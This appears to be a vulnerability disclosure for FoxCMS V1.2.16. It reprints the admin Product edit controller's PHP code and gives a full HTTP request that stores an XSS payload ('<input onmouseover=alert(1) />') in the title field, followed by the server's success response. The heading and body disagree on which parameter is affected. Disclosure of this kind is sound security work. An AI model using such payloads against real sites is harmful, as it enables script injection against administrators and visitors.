FoxCMS - Cross Site Scripting on (app/admin/controller/Product.php title parameter)

Vendor Homepage:
```
https://gitee.com/qianfox/foxcms
```

Version: 

```
V1.2.16
```

Tested on: 

```
PHP, Nignx, MySQL
```

Affected Page:

```
app/admin/controller/Product.php
```

On this page, content parameter is vulnerable to Cross Site Scripting

```
public function edit()
    {
        $param = $this->request->param();

        $bcid = $param['bcid'];
        View::assign('bcid', $bcid);
        $ids = explode('_', $bcid);
        $columnId = $ids[sizeof($ids) - 1]; //栏目id
        $column = Column::find($columnId);
        if (!empty($column->tier)) {
            $bcidStr = '4_' . str_replace(",", "_", $column->tier);
        } else {
            $bcidStr = '4';
        }
        $breadcrumb = Column::getBreadcrumb($bcidStr);
        array_push($breadcrumb, ['id' => '', 'title' => '编辑产品', 'name' => DIRECTORY_SEPARATOR . config('adminconfig.admin_path') . '/Product/add', 'url' => 'javascript:void(0)']);
        View::assign("breadcrumb", $breadcrumb);

        View::assign('id', $param['id']);
        if (array_key_exists('id', $param)) {
            $product = \app\common\model\Product::find($param['id']);
            $articleFieldList = $this->getAttrListAttr($product->article_field);
            View::assign('articleFieldList', $articleFieldList);
            View::assign('product', $product);
        }

        //查询产品参数
        $productParamList = (new ProductParam())->where("product_id", $param['id'])->order("sort asc")->select(); //产品属性
        $clang = $this->getMyLang();
        if ($this->request->isAjax()) {

            //更新产品属性顺序
            if (array_key_exists("product_attr_ids", $param) && !empty($param['product_attr_ids'])) {
                $product_attr_ids = $param['product_attr_ids'];
                $product_attr_idArr = explode(",", $product_attr_ids);
                $ProductAttrUData = [];
                foreach ($product_attr_idArr as $key => $product_attr_id) {
                    array_push($ProductAttrUData, ['sort' => ($key + 1), "id" => $product_attr_id, 'lang' => $clang]);
                }
                (new ProductAttr())->saveAll($ProductAttrUData);
            }
            unset($param['product_attr_ids']);

            //替换内容
            if (array_key_exists("content", $param)) {
                $rdata = $this->replaceContent($param, 'content');
                if ($rdata["code"] == 0) {
                    $this->error($rdata['msg']);
                }
                $param['content'] = $rdata['content']; //替换内容
            }
            $productParams = $param['productParams']; //产品参数
            $product = new \app\common\model\Product();
            $param['lang'] = $clang;
            $product->update($param);
            $productId = $param["id"];

            $productParamDatas = []; //产品参数
            $updateProductParamIds = []; //更新的产品参数id
            foreach ($productParams as $key => $productParam) {
                $saveData = [];
                $pid = $productParam["pid"];
                if ($productParam["is_select"] == 1) { //判断是否下拉
                    //获取下拉选项拉取默认值
                    $productParamObj = (new ProductAttrParam())->find($pid);
                    if ($productParamObj) {
                        $dfvalueStr = str_replace("\n", ",", $productParamObj->dfvalue);

                        $saveData = [
                            'product_id' => $productId,
                            'name' => $productParam["name"],
                            'dfvalue' => $productParam["dfvalue"],
                            'type' => $productParamObj->type,
                            "type_id" => $productParamObj->type_id,
                            'type_desc' => $productParamObj->type_desc,
                            'sel_value' => $dfvalueStr,
                            "attr_param_id" => $pid,
                            'sort' => $productParam['sort']
                        ];
                    }
                } else {
                    $saveData = [
                        'product_id' => $productId,
                        'name' => $productParam["name"],
                        'dfvalue' => $productParam["dfvalue"],
                        'type' => "varchar(255)",
                        "type_id" => 11,
                        'type_desc' => "默认输入",
                        "attr_param_id" => $pid,
                        'sort' => $productParam['sort']
                    ];
                }
                $id = $productParam["id"];
                if (!empty($id)) {
                    $saveData['id'] = intval($id);
                    array_push($updateProductParamIds, intval($id));
                    array_push($productParamDatas, $saveData);
                } else {
                    array_push($productParamDatas, $saveData);
                }
            }

            //查询需要多余参数
            $delProductParamIds = []; //删除的产品参数id
            foreach ($productParamList as $key => $pParam) {
                if (!in_array($pParam["id"], $updateProductParamIds)) {
                    array_push($delProductParamIds, $pParam["id"]);
                }
            }

            if (sizeof($delProductParamIds) > 0) { //删除多余的参数
                ProductParam::whereIn('id', implode(",", $delProductParamIds))->delete();
            } else {
                //                ProductParam::where('product_id', $productId)->delete();//删除之前的参数
            }
            if (sizeof($productParamDatas) > 0) { //保存
                (new ProductParam())->saveAll($productParamDatas);
            }

            $tags = $param["tags"];
            if (!empty($tags)) { //文档标签
                $this->addTags($tags);
            }
            xn_add_admin_log("编辑产品", "product", $param['title']); //添加日志
            $seo = xn_cfg("seo");
            if ($seo["url_model"] == 3) {
                $rparam =  ["columnId" => $param["column_id"], "oneId" => "key3", "first" => 1, "column_model" => "product", "id" => $productId];
                $rparam = array_merge($rparam, $seo);
                $this->success('操作成功', "", $rparam);
            } else {
                $this->success('操作成功');
            }
        }

        View::assign('productParamList', $productParamList);
        return view();
    }
```

Function point location：

<img width="2878" height="1474" alt="36edf75e-fbcc-4333-8282-28c50adf394f" src="https://github.com/user-attachments/assets/44d5b6a8-bf1b-41f9-9c8f-964428c7c42d" />


Request:

```
POST /index.php/admin4435/Product/edit.html HTTP/1.1
Host: www.foxcms.cms
Content-Length: 346
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.foxcms.cms
Referer: http://www.foxcms.cms/index.php/admin4435/Product/edit.html?type=1&bcid=3_14&id=26
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; access_127_0_0_1=1761129226
Connection: close

id=26&title=%3Cinput+onmouseover%3Dalert(1)+%2F%3E&brief_title=&article_field=&column_id=14&column=A%E7%B3%BB%E5%88%97&breviary_pic_id=&keywords=&description=&article_source=&author=&team_status=%2C&content=&release_time=2025-10-22+18%3A48&picset_ids=&click=0&status=1&tags=&product_attr_ids=3%2C4%2C5%2C6%2C7%2C8%2C9%2C&price=&buy_link=&big_img=
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Wed, 22 Oct 2025 10:51:01 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.4
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-CSRF-TOKEN, X-Requested-With
Access-Control-Allow-Origin: http://www.foxcms.cms
Set-Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; expires=Thu, 23-Oct-2025 10:51:01 GMT; Max-Age=86400; path=/
Content-Length: 59

{"code":1,"msg":"操作成功","data":"","url":"","wait":1}
```
<img width="2878" height="1624" alt="image" src="https://github.com/user-attachments/assets/5edf4322-dd5b-401c-8bee-2bba40615122" />
